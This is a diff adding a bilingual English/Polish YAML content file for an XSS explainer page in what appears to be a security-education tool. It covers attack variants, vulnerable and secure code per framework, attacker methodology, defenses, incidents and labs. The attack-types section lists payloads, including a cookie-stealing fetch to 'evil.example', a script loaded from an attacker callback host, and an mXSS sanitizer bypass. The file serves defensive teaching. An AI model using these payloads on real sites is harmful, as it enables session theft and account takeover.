@@ -1,0 +1,549 @@
+meta:
+  id: xss
+  threatId: cat_1_research12
+  severity: Critical
+  color: '#a855f7'
+  colorRgb: 168,85,247
+  cwe: CWE-79
+  cvss: '8.8'
+  standard: OWASP A03:2021
+hero:
+  titleMain: 'Cross-Site '
+  titleGrad: Scripting
+  titleTail: ' (XSS)'
+  topbar: Cross-Site Scripting (XSS)
+  lead:
+    en: 'XSS lets an attacker inject script that the victim''s own browser runs as if it came from the trusted site — reading cookies, riding the session, and rewriting the page. Reflected and stored variants are assembled server-side; DOM-based XSS lives entirely in client JavaScript and may never touch the server at all. Mutation XSS (mXSS) is the sharpest edge case: markup that looks clean to a sanitizer mutates into executable code when the browser re-parses it — a real, recurring bypass class against DOMPurify, the exact sanitizer this project uses. Stored XSS with session-takeover impact is commonly scored around CVSS 8.8.'
+    pl: 'XSS pozwala atakującemu wstrzyknąć skrypt, który przeglądarka ofiary wykonuje tak, jakby pochodził z zaufanej strony — czytając ciasteczka, jadąc na sesji i przepisując stronę. Warianty reflected i stored są składane po stronie serwera; DOM-based XSS żyje wyłącznie w kliencie i może nigdy nie dotrzeć do serwera. Mutation XSS (mXSS) to najostrzejszy przypadek: znacznik wyglądający czysto dla sanitizera mutuje w wykonywalny kod, gdy przeglądarka parsuje go ponownie — realna, powracająca klasa obejść DOMPurify, dokładnie tego sanitizera którego używa ten projekt. Stored XSS z przejęciem sesji jest zwykle oceniany około CVSS 8.8.'
+  metrics:
+  - k: CWE-79
+    v:
+      en: Weakness ID
+      pl: ID słabości
+  - k: '8.8'
+    v: CVSS · Critical
+  - k: A03:2021
+    v: OWASP Top 10
+  - k: '6'
+    v:
+      en: Attack variants
+      pl: Warianty ataku
+  sources:
+  - label: OWASP A03:2021
+    url: https://owasp.org/Top10/A03_2021-Injection/
+  - label: CWE-79 (MITRE)
+    url: https://cwe.mitre.org/data/definitions/79.html
+  - label: PortSwigger Academy
+    url: https://portswigger.net/web-security/cross-site-scripting
+  - label: OWASP XSS Prevention Cheat Sheet
+    url: https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
+sectionOrder:
+- overview
+- types
+- code
+- langrisks
+- method
+- defense
+- incidents
+- tools
+- compliance
+- ir
+- labs
+- sources
+nav:
+- id: overview
+  en: Overview
+  pl: Przegląd
+- id: types
+  en: Attack types
+  pl: Typy ataków
+- id: code
+  en: Vuln vs Secure
+  pl: Podatny vs Bezpieczny
+- id: langrisks
+  en: Framework escape hatches
+  pl: Furtki frameworków
+- id: method
+  en: Methodology
+  pl: Metodyka
+- id: defense
+  en: Defense layers
+  pl: Warstwy obrony
+- id: incidents
+  en: Real incidents
+  pl: Incydenty
+- id: tools
+  en: SAST / DAST
+  pl: SAST / DAST
+- id: compliance
+  en: Compliance
+  pl: Zgodność
+- id: ir
+  en: Incident response
+  pl: Reagowanie
+- id: labs
+  en: Practice labs
+  pl: Laby praktyczne
+- id: sources
+  en: Sources
+  pl: Źródła
+sections:
+  attacks:
+    title:
+      en: Attack types
+      pl: Typy ataków
+    lead:
+      en: Six ways the same trust-boundary violation manifests — from a lured click to a sanitizer-defeating parser trick.
+      pl: Sześć sposobów, w jakie ta sama przyczyna się ujawnia — od nakłonionego kliknięcia po sztuczkę parsera pokonującą sanitizer.
+    items:
+    - name: Reflected XSS
+      sev: high
+      description:
+        en: Untrusted data from the current request is echoed straight back into the response without encoding. Non-persistent — needs a victim to click a crafted link.
+        pl: Niezaufane dane z bieżącego żądania są odsyłane wprost w odpowiedzi bez kodowania. Nieprzetrwałe — wymaga kliknięcia spreparowanego linku przez ofiarę.
+      payload: https://site.com/search?q=<script>alert(document.domain)</script>
+    - name: Stored / Persistent XSS
+      sev: critical
+      description:
+        en: Payload is saved server-side (comment, profile, ticket) and served to every later viewer. No lure needed per victim — highest blast radius, can self-propagate as a worm.
+        pl: Ładunek jest zapisywany po stronie serwera (komentarz, profil, ticket) i serwowany każdemu późniejszemu widzowi. Nie wymaga nakłaniania per ofiara — największy zasięg, może się propagować jako robak.
+      payload: <img src=x onerror="fetch('//evil.example/c?'+document.cookie)">
+    - name: DOM-based XSS
+      sev: high
+      description:
+        en: 'Client-side JavaScript pipes an untrusted DOM source (location.hash, postMessage, referrer) into a dangerous sink (innerHTML, eval). The payload can live entirely after the # and never reach the server.'
+        pl: 'JavaScript po stronie klienta przekazuje niezaufane źródło DOM (location.hash, postMessage, referrer) do niebezpiecznego sinka (innerHTML, eval). Ładunek może żyć wyłącznie po # i nigdy nie dotrzeć do serwera.'
+      payload: https://site.com/#<img src=x onerror=alert(1)>  (reaching el.innerHTML = location.hash.slice(1))
+    - name: Mutation XSS (mXSS)
+      sev: critical
+      description:
+        en: Markup that looks clean to a sanitizer on first parse mutates into executable code when the browser re-parses/re-serializes it, via HTML/SVG/MathML namespace confusion or nesting quirks. Defeats DOMPurify-class sanitizers.
+        pl: Znacznik wyglądający czysto dla sanitizera przy pierwszym parsowaniu mutuje w wykonywalny kod, gdy przeglądarka parsuje/serializuje go ponownie, przez pomieszanie przestrzeni nazw HTML/SVG/MathML lub zagnieżdżenia. Pokonuje sanitizery klasy DOMPurify.
+      payload: <math><mtext></form><form><mglyph><style></math><img src=1 onerror=alert(1)>
+    - name: Blind XSS
+      sev: high
+      description:
+        en: A stored payload that fires in a context the attacker can't directly see (admin panel, support-ticket viewer, log dashboard) — confirmed via an out-of-band callback.
+        pl: Zapisany ładunek uruchamia się w kontekście, którego atakujący nie widzi bezpośrednio (panel admina, podgląd ticketów, dashboard logów) — potwierdzany przez callback out-of-band.
+      payload: '"><script src=//attacker.xss.report/c/id></script>'
+    - name: SVG / Polyglot XSS
+      sev: medium
+      description:
+        en: Script smuggled inside an uploaded/inline SVG (which allows <script> and event handlers), or a single payload crafted to execute across multiple contexts at once to survive filtering.
+        pl: Skrypt przemycony wewnątrz przesłanego/inline SVG (które dopuszcza <script> i handlery zdarzeń), lub jeden ładunek skonstruowany tak, by wykonać się w wielu kontekstach naraz i przetrwać filtrowanie.
+      payload: <svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>
+  code:
+    title:
+      en: Vulnerable vs Secure
+      pl: Podatny vs Bezpieczny
+    lead:
+      en: 'The same fix everywhere: treat untrusted data as text, not markup, unless it passes through an up-to-date sanitizer.'
+      pl: 'Ta sama naprawa wszędzie: traktuj niezaufane dane jako tekst, nie znacznik, chyba że przejdą przez aktualny sanitizer.'
+    languages:
+    - label: JavaScript
+      lang: javascript
+      vulnerable: '// VULNERABLE — untrusted DOM source into an HTML-parsing sink
+
+        const q = decodeURIComponent(location.hash.slice(1));
+
+        el.innerHTML = q;                 // innerHTML = sink
+
+        document.write(location.search);  // document.write = sink'
+      safe: '// SECURE — text sink, no HTML parsing
+
+        const q = decodeURIComponent(location.hash.slice(1));
+
+        el.textContent = q;
+
+        // If HTML is genuinely required, sanitize with an up-to-date DOMPurify:
+
+        el.innerHTML = DOMPurify.sanitize(q);'
+    - label: React
+      lang: jsx
+      vulnerable: '// VULNERABLE — the escape hatch bypasses JSX auto-escaping
+
+        <div dangerouslySetInnerHTML={{ __html: userBio }} />'
+      safe: '// SECURE — JSX auto-escapes text nodes by default
+
+        <div>{userBio}</div>
+
+        // If raw HTML is required:
+
+        <div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(userBio) }} />'
+    - label: Vue
+      lang: html
+      vulnerable: '<!-- VULNERABLE — v-html renders raw HTML -->
+
+        <div v-html="userComment"></div>'
+      safe: '<!-- SECURE — mustache interpolation escapes -->
+
+        <div>{{ userComment }}</div>
+
+        <!-- If HTML needed: v-html="sanitized" where sanitized = DOMPurify.sanitize(userComment) -->'
+    - label: Angular
+      lang: typescript
+      vulnerable: '// VULNERABLE — explicitly disables Angular''s built-in sanitizer
+
+        this.trusted = this.sanitizer.bypassSecurityTrustHtml(userHtml);
+
+        // template: <div [innerHTML]="trusted"></div>'
+      safe: '// SECURE — let Angular''s DomSanitizer scrub it automatically
+
+        // template: <div [innerHTML]="userHtml"></div>
+
+        // Never call bypassSecurityTrust* on user-controlled data.'
+    - label: PHP
+      lang: php
+      vulnerable: '// VULNERABLE
+
+        echo "<p>Hello " . $_GET[''name''] . "</p>";'
+      safe: '// SECURE — context-aware HTML-entity encoding
+
+        echo "<p>Hello " . htmlspecialchars($_GET[''name''], ENT_QUOTES | ENT_HTML5, ''UTF-8'') . "</p>";'
+    - label: Python (Jinja2/Flask)
+      lang: python
+      vulnerable: '# VULNERABLE — |safe disables Jinja2''s autoescaping
+
+        return render_template_string("<p>{{ comment|safe }}</p>", comment=request.args[''c''])'
+      safe: '# SECURE — Jinja2 autoescapes {{ comment }} by default in .html templates
+
+        return render_template("page.html", comment=request.args[''c''])'
+  langRisks:
+    title:
+      en: Framework escape hatches
+      pl: Furtki frameworków
+    lead:
+      en: Every major framework auto-escapes by default — and every one ships a documented escape hatch that turns it back off.
+      pl: Każdy większy framework domyślnie auto-escapuje — i każdy ma udokumentowaną furtkę, która to wyłącza.
+    rows:
+    - fw: React
+      api: 'dangerouslySetInnerHTML={{__html: x}}'
+      note:
+        en: 'The name is the warning. Only pass content through DOMPurify.sanitize() first; never raw user input. Also validate URL schemes in href/src — JSX does not block javascript: URLs.'
+        pl: Nazwa jest ostrzeżeniem. Przepuszczaj treść wyłącznie przez DOMPurify.sanitize(); nigdy surowe wejście użytkownika. Waliduj też schemat URL w href/src — JSX nie blokuje adresów javascript:.
+    - fw: Vue
+      api: v-html="x"
+      note:
+        en: Renders raw HTML, bypassing Vue's default text-interpolation escaping. Sanitize before binding, same rule as React.
+        pl: Renderuje surowy HTML, omijając domyślne escapowanie interpolacji tekstu Vue. Sanityzuj przed powiązaniem, ta sama zasada co w React.
+    - fw: Angular
+      api: sanitizer.bypassSecurityTrustHtml(x)
+      note:
+        en: Explicitly disables Angular's DomSanitizer for that value. Only ever call it on content you fully control, never on user input.
+        pl: Jawnie wyłącza DomSanitizer Angulara dla tej wartości. Wywołuj tylko na treści, którą w pełni kontrolujesz, nigdy na wejściu użytkownika.
+    - fw: Jinja2 / Flask
+      api: '{{ x|safe }}  /  Markup(x)'
+      note:
+        en: Disables Jinja2's default autoescaping for that value. If HTML must render, sanitize server-side first (e.g. nh3), then mark safe.
+        pl: Wyłącza domyślne autoescapowanie Jinja2 dla tej wartości. Jeśli HTML musi się wyświetlić, sanityzuj po stronie serwera (np. nh3), dopiero potem oznacz jako safe.
+    - fw: jQuery
+      api: .html(x)
+      note:
+        en: Equivalent to innerHTML — parses and executes markup. Use .text(x) for plain text, or sanitize first if HTML is required.
+        pl: Odpowiednik innerHTML — parsuje i wykonuje znacznik. Użyj .text(x) dla zwykłego tekstu, albo sanityzuj jeśli HTML jest wymagany.
+  method:
+    title:
+      en: Attack methodology
+      pl: Metodyka ataku
+    lead:
+      en: How an attacker goes from a benign probe to session takeover.
+      pl: Jak atakujący przechodzi od niegroźnej sondy do przejęcia sesji.
+    steps:
+    - title:
+        en: Map input surface
+        pl: Mapowanie powierzchni wejścia
+      description:
+        en: 'Enumerate every reflection and storage point: query params, form fields, headers, JSON fields, file names, and client-side sources (location.*, postMessage, localStorage).'
+        pl: 'Wylicz każdy punkt odbicia i zapisu: parametry zapytania, pola formularzy, nagłówki, pola JSON, nazwy plików i źródła klienckie (location.*, postMessage, localStorage).'
+    - title:
+        en: Probe with a canary
+        pl: Sonda z markerem
+      description:
+        en: Inject a unique benign marker and find where and how it lands — HTML body, attribute, inside a <script> block, or a URL.
+        pl: Wstrzyknij unikalny, niegroźny marker i znajdź gdzie i jak ląduje — ciało HTML, atrybut, wewnątrz bloku <script>, czy URL.
+    - title:
+        en: Identify the context
+        pl: Identyfikacja kontekstu
+      description:
+        en: Send < > " ' ; and see what survives encoded/stripped. This determines the exact break-out needed.
+        pl: Wyślij < > " ' ; i sprawdź co przetrwa zakodowane/usunięte. To determinuje dokładny sposób wyłamania się.
+    - title:
+        en: Break out of context
+        pl: Wyłamanie z kontekstu
+      description:
+        en: 'Craft the minimal payload for that context: </script> to escape a JS string, " onmouseover=... to escape a quoted attribute, javascript: for a URL sink.'
+        pl: 'Skonstruuj minimalny ładunek dla tego kontekstu: </script> by uciec ze stringa JS, " onmouseover=... by uciec z cudzysłowionego atrybutu, javascript: dla sinka URL.'
+    - title:
+        en: Bypass filters
+        pl: Obejście filtrów
+      description:
+        en: Case variation, alternative tags/handlers (onerror, onload, svg, details/ontoggle), encoding tricks, and — against sanitizers — mXSS namespace-confusion payloads.
+        pl: Wariacja wielkości liter, alternatywne tagi/handlery (onerror, onload, svg, details/ontoggle), sztuczki kodowania i — przeciw sanitizerom — ładunki mXSS z pomieszaniem przestrzeni nazw.
+    - title:
+        en: Confirm execution
+        pl: Potwierdzenie wykonania
+      description:
+        en: Escalate from alert(document.domain) to an out-of-band callback for blind contexts (admin panels, support tickets).
+        pl: Eskaluj od alert(document.domain) do callbacku out-of-band dla ślepych kontekstów (panele admina, tickety wsparcia).
+    - title:
+        en: Weaponize
+        pl: Uzbrojenie
+      description:
+        en: Exfiltrate non-HttpOnly cookies, ride the session to change email/password (defeats CSRF tokens read from the DOM), inject a credential-phishing overlay, or self-propagate as a worm.
+        pl: Eksfiltruj ciasteczka bez HttpOnly, jedź na sesji by zmienić e-mail/hasło (pokonuje tokeny CSRF czytane z DOM), wstrzyknij nakładkę phishingową, albo propaguj się jako robak.
+  defenses:
+    title:
+      en: Defense layers, ranked
+      pl: Warstwy obrony wg skuteczności
+    lead:
+      en: Defense in depth — encoding and auto-escaping do the real work; everything else is a safety net.
+      pl: Obrona w głąb — kodowanie i auto-escapowanie robią realną robotę; reszta to siatka bezpieczeństwa.
+    items:
+    - rank: 1
+      eff: 92
+      kind: primary
+      label:
+        en: Context-aware output encoding
+        pl: Kodowanie wyjścia świadome kontekstu
+      note:
+        en: Encode for the exact sink — HTML body, attribute, JS string, URL, or CSS. The root-cause fix; fails only if the wrong context's encoder is used.
+        pl: Koduj dla dokładnego sinka — ciało HTML, atrybut, string JS, URL, lub CSS. Naprawa źródłowa; zawodzi tylko przy użyciu enkodera dla złego kontekstu.
+    - rank: 2
+      eff: 88
+      kind: strong
+      label:
+        en: Framework auto-escaping
+        pl: Auto-escapowanie frameworka
+      note:
+        en: React/Vue/Angular/Jinja2 escape by default, making the safe path the path of least resistance. Residual risk = the documented escape hatches.
+        pl: React/Vue/Angular/Jinja2 domyślnie escapują, czyniąc bezpieczną ścieżkę najmniej oporu. Ryzyko szczątkowe = udokumentowane furtki.
+    - rank: 3
+      eff: 85
+      kind: strong
+      label:
+        en: Trusted Types API
+        pl: API Trusted Types
+      note:
+        en: Enforced via CSP, forces dangerous DOM sinks (innerHTML, eval) to reject raw strings unless passed through a vetted policy — near-categorical kill for DOM-based XSS. Browser support still uneven.
+        pl: Egzekwowane przez CSP, wymusza odrzucenie surowych stringów przez niebezpieczne sinki DOM (innerHTML, eval), chyba że przejdą przez zweryfikowaną politykę — niemal kategoryczne zabicie DOM XSS. Wsparcie przeglądarek wciąż nierówne.
+    - rank: 4
+      eff: 78
+      kind: mitigation
+      label:
+        en: Content Security Policy (CSP)
+        pl: Content Security Policy (CSP)
+      note:
+        en: A strict nonce/hash-based script-src blocks inline/injected script execution even when an injection lands. Real-world CSPs are frequently weakened by unsafe-inline or broad allowlists.
+        pl: Ścisła, oparta na nonce/hash polityka script-src blokuje wykonanie wstrzykniętego skryptu nawet gdy wstrzyknięcie się powiedzie. W praktyce CSP jest często osłabiane przez unsafe-inline lub szerokie allowlisty.
+    - rank: 5
+      eff: 78
+      kind: strong
+      label:
+        en: Sanitization libraries (DOMPurify)
+        pl: Biblioteki sanitizujące (DOMPurify)
+      note:
+        en: Essential when user HTML must render. Must be kept fully up to date — mXSS/namespace-confusion bypasses recur roughly annually (CVE-2024-47875, CVE-2024-45801, CVE-2020-26870).
+        pl: Niezbędne gdy HTML użytkownika musi się wyświetlić. Musi być stale aktualizowane — obejścia mXSS/pomieszania przestrzeni nazw powracają mniej więcej co roku (CVE-2024-47875, CVE-2024-45801, CVE-2020-26870).
+    - rank: 6
+      eff: 58
+      kind: mitigation
+      label:
+        en: Input validation / allow-listing
+        pl: Walidacja wejścia / allowlista
+      note:
+        en: Useful supporting layer for structured fields (IDs, emails), but XSS is fundamentally an output problem — never sufficient alone.
+        pl: Przydatna warstwa wspierająca dla pól strukturalnych (ID, e-maile), ale XSS to fundamentalnie problem wyjścia — nigdy niewystarczająca sama w sobie.
+    - rank: 7
+      eff: 38
+      kind: weak
+      label:
+        en: HttpOnly / Secure / SameSite cookies
+        pl: Ciasteczka HttpOnly / Secure / SameSite
+      note:
+        en: Does not fix the vulnerability — only blocks one exfiltration path (reading document.cookie). Session riding, keylogging, and localStorage-token theft still work.
+        pl: Nie naprawia podatności — blokuje tylko jedną ścieżkę eksfiltracji (odczyt document.cookie). Jazda na sesji, keylogging i kradzież tokenów z localStorage nadal działają.
+  incidents:
+    title:
+      en: Real-world incidents
+      pl: Rzeczywiste incydenty
+    lead:
+      en: From a 2005 worm that hit a million profiles in a day to 2024 sanitizer bypasses against the exact library this project uses.
+      pl: Od robaka z 2005 roku, który uderzył w milion profili w jeden dzień, po obejścia sanitizera z 2024 przeciw dokładnie tej bibliotece, której używa ten projekt.
+    items:
+    - org: Samy worm (MySpace)
+      year: 2005
+      impact: ~1M profiles / 20h
+      cost: Stored XSS worm
+      description:
+        en: Samy Kamkar's stored-XSS payload added him as a friend and copied itself to every viewer's profile, infecting over a million profiles in under 20 hours — the fastest-spreading XSS worm on record. MySpace was taken offline to remediate.
+        pl: Ładunek stored XSS Samy'ego Kamkara dodawał go jako znajomego i kopiował się na profil każdego widza, infekując ponad milion profili w niecałe 20 godzin — najszybciej rozprzestrzeniający się robak XSS w historii. MySpace zostało wyłączone by to naprawić.
+    - org: TweetDeck worm
+      year: 2014
+      impact: ~82,000 users
+      cost: Stored XSS worm
+      description:
+        en: A stored XSS in TweetDeck's tweet rendering let a crafted tweet auto-retweet itself in every viewer's client with no click needed, spreading to over 82,000 users before Twitter took TweetDeck offline to patch.
+        pl: Stored XSS w renderowaniu tweetów TweetDeck pozwoliło spreparowanemu tweetowi automatycznie się retweetować u każdego widza bez kliknięcia, docierając do ponad 82 000 użytkowników zanim Twitter wyłączył TweetDeck by załatać.
+    - org: DOMPurify mXSS bypasses
+      year: 2024
+      impact: CVE-2024-47875 / CVE-2024-45801
+      cost: CVSS 10.0 (47875)
+      description:
+        en: Nesting-based mutation-XSS bypassed DOMPurify's depth checks via foreign-content parsing; a related bypass was aided by prototype pollution weakening the same check. Fixed in DOMPurify 2.5.4 / 3.1.3 — directly relevant since this project uses DOMPurify.
+        pl: Mutacyjny XSS oparty na zagnieżdżeniu obchodził kontrole głębokości DOMPurify przez parsowanie obcej treści; powiązane obejście wspomagało zanieczyszczenie prototypu, osłabiając tę samą kontrolę. Naprawione w DOMPurify 2.5.4 / 3.1.3 — bezpośrednio istotne, bo ten projekt używa DOMPurify.
+    - org: British Airways (Magecart)
+      year: 2018
+      impact: ~429,000 customers
+      cost: £20M ICO fine
+      description:
+        en: Attackers modified a JavaScript file on BA's site to skim payment data for ~15 days. All three independent research teams flag this as Magecart-style third-party script injection, not textbook reflected/stored XSS — included here with that caveat since it's commonly cited alongside XSS incidents.
+        pl: Atakujący zmodyfikowali plik JavaScript na stronie BA, wykradając dane płatnicze przez ~15 dni. Wszystkie trzy niezależne zespoły badawcze oznaczają to jako wstrzyknięcie skryptu w stylu Magecart, nie podręcznikowy reflected/stored XSS — dołączone tu z tym zastrzeżeniem, bo jest często cytowane obok incydentów XSS.
+    - org: eBay listings
+      year: 2016
+      impact: Multiple reports 2015-2017
+      cost: Stored XSS → phishing
+      description:
+        en: Researchers repeatedly reported stored XSS in eBay auction/listing descriptions used to redirect shoppers to spoofed login pages. Reported across multiple years; exact scope varies by source (Medium confidence on precise figures).
+        pl: Badacze wielokrotnie zgłaszali stored XSS w opisach aukcji/ofert eBay, wykorzystywany do przekierowania kupujących na fałszywe strony logowania. Zgłaszane przez kilka lat; dokładny zasięg różni się w zależności od źródła (średnia pewność co do precyzyjnych liczb).
+    inlineSources:
+    - label: CVE-2024-47875
+      url: https://www.cve.org/CVERecord?id=CVE-2024-47875
+    - label: CVE-2024-45801
+      url: https://www.cve.org/CVERecord?id=CVE-2024-45801
+    - label: DOMPurify Attack Classes & Bypass History
+      url: https://github.com/cure53/DOMPurify/wiki/Attack-Classes-%26-Bypass-History
+    - label: British Airways data breach (ICO)
+      url: https://ico.org.uk/action-weve-taken/enforcement/british-airways/
+  tools:
+    title:
+      en: Detection tooling
+      pl: Narzędzia wykrywania
+    lead:
+      en: Static analysis traces untrusted data into dangerous sinks; dynamic scanners and DOM-tracing tools confirm real exploitability, including blind and DOM-based cases.
+      pl: Analiza statyczna śledzi niezaufane dane do niebezpiecznych sinków; skanery dynamiczne i narzędzia śledzące DOM potwierdzają realną eksploatowalność, w tym przypadki ślepe i DOM-based.
+    sast:
+    - - Semgrep
+      - Taint rules for innerHTML, dangerouslySetInnerHTML, v-html, render_template_string
+    - - CodeQL
+      - 'Dataflow: untrusted source → HTML/JS sink across the whole codebase'
+    - - SonarQube
+      - Broad multi-language XSS ruleset integrated into quality gates
+    - - eslint-plugin-no-unsanitized
+      - Lint-time flag on dangerous DOM-sink assignments in JS/TS
+    dast:
+    - - Burp Suite
+      - Active Scan + DOM Invader for DOM-based/mXSS source→sink tracing
+    - - OWASP ZAP
+      - Open-source active/passive XSS scanning, CI-friendly
+    - - XSStrike
+      - Context-aware XSS fuzzer with WAF-bypass payload mutation
+    - - Dalfox
+      - Fast Go-based XSS scanner, good for CI automation and blind XSS
+    note:
+      en: <strong>Key signal:</strong> grep for <code>innerHTML</code>, <code>document.write</code>, <code>dangerouslySetInnerHTML</code>, <code>v-html</code>, <code>bypassSecurityTrustHtml</code> and <code>|safe</code> fed by request data — these are the dangerous-sink patterns that matter.
+      pl: <strong>Kluczowy sygnał:</strong> szukaj <code>innerHTML</code>, <code>document.write</code>, <code>dangerouslySetInnerHTML</code>, <code>v-html</code>, <code>bypassSecurityTrustHtml</code> i <code>|safe</code> zasilanych danymi żądania — to niebezpieczne wzorce sinków, na których warto się skupić.
+  compliance:
+    title:
+      en: Compliance quick-reference
+      pl: Szybka zgodność
+    lead:
+      en: All three variants (reflected/stored/DOM) sit under one primary CWE, not three separate ones — a common misunderstanding worth correcting.
+      pl: Wszystkie trzy warianty (reflected/stored/DOM) mieszczą się pod jednym głównym CWE, nie trzema osobnymi — częste nieporozumienie warte sprostowania.
+    items:
+    - std: CWE (MITRE)
+      items:
+      - CWE-79 — primary/parent entry for all XSS (reflected/stored/DOM are variants under it, not separate CWE numbers)
+      - CWE-80 — Basic XSS (script-related HTML tags)
+      - CWE-83 — Script in attributes
+      - CWE-87 — Alternate XSS syntax
+    - std: OWASP
+      items:
+      - A03:2021 — Injection (XSS merged in; was its own A7:2017 category)
+      - ASVS V5 — Validation, Sanitization & Encoding
+      - OWASP XSS Prevention Cheat Sheet + DOM-based XSS Prevention Cheat Sheet
+    - std: PCI DSS v4.0
+      items:
+      - 6.2.4 — address common software attacks including XSS in bespoke code
+      - 6.4.3 / 11.6.1 — manage and monitor payment-page scripts (Magecart-motivated)
+    - std: CAPEC
+      items:
+      - CAPEC-63 — Cross-Site Scripting (parent)
+      - CAPEC-591 — Reflected XSS
+      - CAPEC-592 — Stored XSS
+      - CAPEC-588 — DOM-Based XSS
+    inlineSources:
+    - label: CWE-79 (MITRE)
+      url: https://cwe.mitre.org/data/definitions/79.html
+    - label: OWASP A03:2021
+      url: https://owasp.org/Top10/A03_2021-Injection/
+    - label: PCI DSS v4.0
+      url: https://www.pcisecuritystandards.org/document_library/
+  ir:
+    title:
+      en: Incident response checklist
+      pl: Lista kontrolna reagowania
+    lead:
+      en: If you confirm an active XSS exploitation (especially stored/worm-capable), work this list top to bottom.
+      pl: Po potwierdzeniu aktywnej eksploatacji XSS (zwłaszcza stored/zdolnego do propagacji), przejdź tę listę od góry.
+    steps:
+    - en: Remove the stored payload immediately and search for other instances of it across the app
+      pl: Natychmiast usuń zapisany ładunek i przeszukaj aplikację pod kątem innych jego wystąpień
+    - en: Invalidate all active sessions that may have been ridden or hijacked; force re-authentication
+      pl: Unieważnij wszystkie aktywne sesje, które mogły zostać przejęte; wymuś ponowne uwierzytelnienie
+    - en: Rotate any credentials/tokens that could have been exfiltrated via document.cookie or localStorage
+      pl: Zrotuj wszelkie poświadczenia/tokeny, które mogły zostać wykradzione przez document.cookie lub localStorage
+    - en: Check whether the payload propagated (worm behavior) — audit affected records/profiles for copies
+      pl: Sprawdź czy ładunek się rozprzestrzenił (zachowanie robaka) — przejrzyj dotknięte rekordy/profile pod kątem kopii
+    - en: 'Patch the root cause: add context-aware encoding at the sink, not just a blocklist filter'
+      pl: 'Załataj przyczynę źródłową: dodaj kodowanie świadome kontekstu przy sinku, nie tylko filtr blocklisty'
+    - en: Deploy or tighten CSP (nonce/hash-based, no unsafe-inline) as a second line of defense
+      pl: Wdróż lub zaostrz CSP (oparte na nonce/hash, bez unsafe-inline) jako drugą linię obrony
+    - en: If DOMPurify or another sanitizer is in the path, update to the latest version immediately
+      pl: Jeśli w ścieżce jest DOMPurify lub inny sanitizer, natychmiast zaktualizuj do najnowszej wersji
+    - en: Notify per applicable compliance obligations and sweep sibling endpoints with Semgrep/CodeQL
+      pl: Powiadom zgodnie z obowiązującymi wymogami zgodności i przeskanuj bliźniacze endpointy Semgrep/CodeQL
+  labs:
+    title:
+      en: Practice labs
+      pl: Laby praktyczne
+    lead:
+      en: Curated external labs to practice this exact attack — self-reported, not verified by Code Guardian.
+      pl: Kuratorowane zewnętrzne laby do przećwiczenia tego ataku — samodzielnie zgłaszane, nie weryfikowane przez Code Guardian.
+    items:
+    - variant: Reflected XSS
+      provider: PortSwigger Web Security Academy
+      label: Reflected XSS into HTML context with nothing encoded
+      url: https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded
+    - variant: Stored / Persistent XSS
+      provider: PortSwigger Web Security Academy
+      label: Stored XSS into HTML context with nothing encoded
+      url: https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded
+    - variant: DOM-based XSS
+      provider: PortSwigger Web Security Academy
+      label: Reflected DOM XSS
+      url: https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-reflected
+    - variant: SVG / Polyglot XSS
+      provider: PortSwigger Web Security Academy
+      label: Reflected XSS into HTML context with all tags blocked except custom ones
+      url: https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-all-standard-tags-blocked
+  sources:
+    title:
+      en: Sources
+      pl: Źródła
+    items:
+    - label: OWASP A03:2021 Injection
+      url: https://owasp.org/Top10/A03_2021-Injection/
+    - label: CWE-79 (MITRE)
+      url: https://cwe.mitre.org/data/definitions/79.html
+    - label: OWASP XSS Prevention Cheat Sheet
+      url: https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
+    - label: OWASP DOM-based XSS Prevention Cheat Sheet
+      url: https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html
+    - label: PortSwigger — Cross-site scripting
+      url: https://portswigger.net/web-security/cross-site-scripting
+    - label: PortSwigger — Bypassing DOMPurify with mutation XSS
+      url: https://portswigger.net/research/bypassing-dompurify-again-with-mutation-xss
+    - label: DOMPurify Attack Classes & Bypass History
+      url: https://github.com/cure53/DOMPurify/wiki/Attack-Classes-%26-Bypass-History
+    - label: NIST NVD — CWE-79
+      url: https://nvd.nist.gov/vuln/search/results?cwe_id=CWE-79
